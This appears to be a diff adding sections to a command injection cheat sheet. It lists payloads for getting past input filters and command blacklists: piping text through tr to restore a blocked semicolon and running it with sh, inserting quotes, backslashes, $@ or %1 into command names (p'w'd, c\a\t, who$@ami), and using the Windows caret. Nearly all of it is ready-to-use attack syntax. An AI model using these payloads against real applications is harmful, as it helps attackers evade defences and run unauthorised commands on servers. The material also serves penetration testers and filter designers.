@@ -147,5 +147,59 @@ Or
 
 ### Character Shifting
 
-- Shift ASCII values of blocked characters to bypass filters.
-- 
+- Shift ASCII values of blocked characters to bypass filters
+- For example, if semicolon (;) is blocked (ASCII 59), use colon (:) (ASCII 58) and then shift it back in the command execution context.
+- Example payload:
+  - Instead of `;`, use `:` and then use a command to convert it back to `;` during execution.
+  - `echo "ls -la" | tr ':' ';' | sh`
+  - To find ASCII values and characters:
+  - `man ascii`     # \ is on 92, before it is [ on 91
+
+  -  `echo $(tr '!-}' '"-~'<<<[)`
+-  
+### Bypass Blacklisted Commands
+
+#### LINUX & WINDOWS
+
+##### Use of quotes
+- Use single quotes (' '), double quotes (" "), or backticks (` `) between command letters as Bash or PowerShell ignores them.
+  - Example: pwd can be written as p'w'd or p"w"d or p`w`d
+- There are 2 rules to remember:
+-  1. You cannot mix different quotes within the same command.
+-  2. The number of quotes used must be even.
+-  Example payloads:
+  - `p'w'd`
+  - `p"w"d`
+  - `p`w`d`
+  - "p"w'd'
+
+#### LINUX
+
+- doesn't have to be even.
+
+##### Using backslashes
+
+- Use backslashes (\) to escape characters in commands.
+  - Example payloads:
+    - `l\s` (for ls)
+    - `p\w\d` (for pwd)
+    - `c\a\t` (for cat)
+##### Using positional parameter
+
+- Use $@
+- Example payload:
+  - who$@ami
+
+#### WINDOWS
+
+##### Using caret (^)
+- Use caret (^) to escape characters in commands.
+  - Example payloads:
+    - `l^s` (for ls)
+    - `p^w^d` (for pwd)
+    - `c^a^t` (for cat)
+##### Using positional parameter
+- Use %1, %2, etc.
+- Example payload:
+  - who%1ami
+
